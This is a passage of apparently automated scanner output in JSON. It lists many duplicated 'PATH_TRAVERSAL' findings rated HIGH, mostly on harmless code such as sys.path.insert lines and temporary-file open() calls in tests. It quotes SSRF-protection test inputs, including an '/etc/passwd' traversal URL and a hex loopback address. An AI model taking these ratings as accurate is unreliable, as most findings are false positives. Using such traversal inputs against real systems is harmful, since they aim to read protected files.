            "context": "            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],\n            [\"http://localhost/a/b/c\", \"d//e\", \"http://localhost/a/b/d//e\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 408,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],",
            "context": "            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],\n            [\"http://localhost/a/b/c\", \"d//e\", \"http://localhost/a/b/d//e\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 408,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],",
            "context": "            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],\n            [\"http://localhost/a/b/c\", \"d//e\", \"http://localhost/a/b/d//e\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/python/test/test_url.py",
            "line": 408,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "[\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],",
            "context": "            [\"http://localhost/a/./c\", \"../d/e\", \"http://localhost/d/e\"],\n            [\"http://localhost/a/./c/\", \"../d/e\", \"http://localhost/a/d/e\"],\n            [\"http://localhost/a/b/c/d\", \"./e/../f/../g\", \"http://localhost/a/b/c/g\"],\n            [\"http://localhost/a/b/c\", \"d//e\", \"http://localhost/a/b/d//e\"],\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/internet/test/test_stdio.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self.extraFile = open(path, \"rb+\")",
            "context": "        path = self.mktemp()\n        open(path, \"wb\").close()\n        self.extraFile = open(path, \"rb+\")\n        self.addCleanup(self.extraFile.close)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_tap.py",
            "line": 45,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(self.filename, \"wb+\") as f:",
            "context": "        \"\"\"\n        self.filename = self.mktemp()\n        with open(self.filename, \"wb+\") as f:\n            f.write(b\":\".join(self.usernamePassword))\n        self.options = tap.Options()",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_cftp.py",
            "line": 1083,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"ls ../\" + self.testDir.basename(),",
            "context": "        d = self.runScript(\n            \"ls\",\n            \"ls ../\" + self.testDir.basename(),\n            \"ls *File\",\n            \"ls -a *File\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/test/test_cftp.py",
            "line": 1083,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"ls ../\" + self.testDir.basename(),",
            "context": "        d = self.runScript(\n            \"ls\",\n            \"ls ../\" + self.testDir.basename(),\n            \"ls *File\",\n            \"ls -a *File\",",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/client/default.py",
            "line": 86,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "ui = ConsoleUI(lambda: _open(\"/dev/tty\", \"r+b\", buffering=0))",
            "context": "        )\n    )\n    ui = ConsoleUI(lambda: _open(\"/dev/tty\", \"r+b\", buffering=0))\n    return kh.verifyHostKey(ui, actualHost, host, actualKey)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/conch/scripts/conch.py",
            "line": 150,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "f = open(options[\"logfile\"], \"a+\")",
            "context": "                f = sys.stdout\n            else:\n                f = open(options[\"logfile\"], \"a+\")\n        else:\n            f = sys.stderr",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_mail.py",
            "line": 1061,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(name + \"-H\", \"wb\") as f:",
            "context": "        for i in range(10):\n            name = os.path.join(self.tmpdir, \"body-%d\" % (i,))\n            with open(name + \"-H\", \"wb\") as f:\n                pickle.dump([\"from-%d\" % (i,), \"to-%d\" % (i,)], f)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_mail.py",
            "line": 1064,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "f = open(name + \"-D\", \"w\")",
            "context": "                pickle.dump([\"from-%d\" % (i,), \"to-%d\" % (i,)], f)\n\n            f = open(name + \"-D\", \"w\")\n            f.write(name)\n            f.seek(0, 0)",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_mail.py",
            "line": 2381,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "return open(os.path.join(self.directory, message + \"-H\"), \"rb\")",
            "context": "        @return: The envelope file for the message.\n        \"\"\"\n        return open(os.path.join(self.directory, message + \"-H\"), \"rb\")\n\n    def getPath(self, message):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_mail.py",
            "line": 2404,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "headerFile = open(os.path.join(self.directory, fname + \"-H\"), \"wb\")",
            "context": "        \"\"\"\n        fname = f\"{time.time()}_{id(self)}\"\n        headerFile = open(os.path.join(self.directory, fname + \"-H\"), \"wb\")\n        tempFilename = os.path.join(self.directory, fname + \"-C\")\n        finalFilename = os.path.join(self.directory, fname + \"-D\")",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_mail.py",
            "line": 2510,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "open(self.noisyMessage + \"-D\", \"w\").close()",
            "context": "        self.quietMessage = os.path.join(self.tmpdir, quietBaseName)\n\n        open(self.noisyMessage + \"-D\", \"w\").close()\n\n        open(self.quietMessage + \"-D\", \"w\").close()",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_mail.py",
            "line": 2512,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "open(self.quietMessage + \"-D\", \"w\").close()",
            "context": "        open(self.noisyMessage + \"-D\", \"w\").close()\n\n        open(self.quietMessage + \"-D\", \"w\").close()\n\n        self.noisyAttemptMgr.manager.managed[\"noisyRelayer\"] = [noisyBaseName]",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_mail.py",
            "line": 2517,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(self.noisyMessage + \"-H\", \"wb\") as envelope:",
            "context": "        self.quietAttemptMgr.manager.managed[\"quietRelayer\"] = [quietBaseName]\n\n        with open(self.noisyMessage + \"-H\", \"wb\") as envelope:\n            pickle.dump([\"from-noisy@domain\", \"to-noisy@domain\"], envelope)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/mail/test/test_mail.py",
            "line": 2520,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "with open(self.quietMessage + \"-H\", \"wb\") as envelope:",
            "context": "            pickle.dump([\"from-noisy@domain\", \"to-noisy@domain\"], envelope)\n\n        with open(self.quietMessage + \"-H\", \"wb\") as envelope:\n            pickle.dump([\"from-quiet@domain\", \"to-quiet@domain\"], envelope)\n",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/names/test/test_client.py",
            "line": 278,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "resolvConf = handle.open(mode=\"w+\")",
            "context": "        \"\"\"\n        handle = FilePath(self.mktemp())\n        resolvConf = handle.open(mode=\"w+\")\n\n        class StubResolver(client.Resolver):",
            "cvss_score": 8.5
          },
          {
            "file": "test_env/lib/python3.12/site-packages/twisted/words/protocols/irc.py",
            "line": 3155,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self.file = open(dst, \"rb+\")",
            "context": "            # I have been told I want to resume, and a file already\n            # exists - Here we go\n            self.file = open(dst, \"rb+\")\n            self.file.seek(self._resumeOffset)\n            self.file.truncate()",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/test_ssrf_protection.py",
            "line": 141,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"http://example.com/../../../etc/passwd\",  # Directory traversal",
            "context": "            \"http://user:pass@example.com/\",  # Credentials\n            \"http://example.com/%2e%2e/\",  # URL-encoded traversal\n            \"http://example.com/../../../etc/passwd\",  # Directory traversal\n            \"http://0x7f000001/\",  # Hex IP notation\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/test_ssrf_protection.py",
            "line": 141,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"http://example.com/../../../etc/passwd\",  # Directory traversal",
            "context": "            \"http://user:pass@example.com/\",  # Credentials\n            \"http://example.com/%2e%2e/\",  # URL-encoded traversal\n            \"http://example.com/../../../etc/passwd\",  # Directory traversal\n            \"http://0x7f000001/\",  # Hex IP notation\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/test_ssrf_protection.py",
            "line": 141,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"http://example.com/../../../etc/passwd\",  # Directory traversal",
            "context": "            \"http://user:pass@example.com/\",  # Credentials\n            \"http://example.com/%2e%2e/\",  # URL-encoded traversal\n            \"http://example.com/../../../etc/passwd\",  # Directory traversal\n            \"http://0x7f000001/\",  # Hex IP notation\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/test_ssrf_protection.py",
            "line": 141,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"http://example.com/../../../etc/passwd\",  # Directory traversal",
            "context": "            \"http://user:pass@example.com/\",  # Credentials\n            \"http://example.com/%2e%2e/\",  # URL-encoded traversal\n            \"http://example.com/../../../etc/passwd\",  # Directory traversal\n            \"http://0x7f000001/\",  # Hex IP notation\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/test_ssrf_protection.py",
            "line": 141,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"http://example.com/../../../etc/passwd\",  # Directory traversal",
            "context": "            \"http://user:pass@example.com/\",  # Credentials\n            \"http://example.com/%2e%2e/\",  # URL-encoded traversal\n            \"http://example.com/../../../etc/passwd\",  # Directory traversal\n            \"http://0x7f000001/\",  # Hex IP notation\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/test_ssrf_protection.py",
            "line": 141,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"http://example.com/../../../etc/passwd\",  # Directory traversal",
            "context": "            \"http://user:pass@example.com/\",  # Credentials\n            \"http://example.com/%2e%2e/\",  # URL-encoded traversal\n            \"http://example.com/../../../etc/passwd\",  # Directory traversal\n            \"http://0x7f000001/\",  # Hex IP notation\n        ]",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/run_all_performance_tests.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\n",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/run_all_performance_tests.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\n",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/run_all_performance_tests.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\n",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/run_all_performance_tests.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\n",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_memory_usage.py",
            "line": 21,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_memory_usage.py",
            "line": 21,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_memory_usage.py",
            "line": 21,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_memory_usage.py",
            "line": 21,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_rust_acceleration.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.rust_accelerated import (",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_rust_acceleration.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.rust_accelerated import (",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_rust_acceleration.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.rust_accelerated import (",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_rust_acceleration.py",
            "line": 17,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.rust_accelerated import (",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/mcp_stress_testing.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.mcp.manager import get_mcp_manager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/mcp_stress_testing.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.mcp.manager import get_mcp_manager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/mcp_stress_testing.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.mcp.manager import get_mcp_manager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/mcp_stress_testing.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.mcp.manager import get_mcp_manager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/mcp_performance_benchmarks.py",
            "line": 19,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.mcp.manager import get_mcp_manager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/mcp_performance_benchmarks.py",
            "line": 19,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.mcp.manager import get_mcp_manager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/mcp_performance_benchmarks.py",
            "line": 19,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.mcp.manager import get_mcp_manager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/mcp_performance_benchmarks.py",
            "line": 19,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.mcp.manager import get_mcp_manager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_load_scenarios.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_load_scenarios.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_load_scenarios.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/performance/test_load_scenarios.py",
            "line": 20,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_performance_regression.py",
            "line": 22,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_performance_regression.py",
            "line": 22,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_performance_regression.py",
            "line": 22,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_performance_regression.py",
            "line": 22,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_stress.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_stress.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_stress.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_stress.py",
            "line": 24,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_gc_performance.py",
            "line": 23,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_gc_performance.py",
            "line": 23,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_gc_performance.py",
            "line": 23,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_gc_performance.py",
            "line": 23,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_leaks.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_leaks.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_leaks.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/memory/test_memory_leaks.py",
            "line": 25,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))",
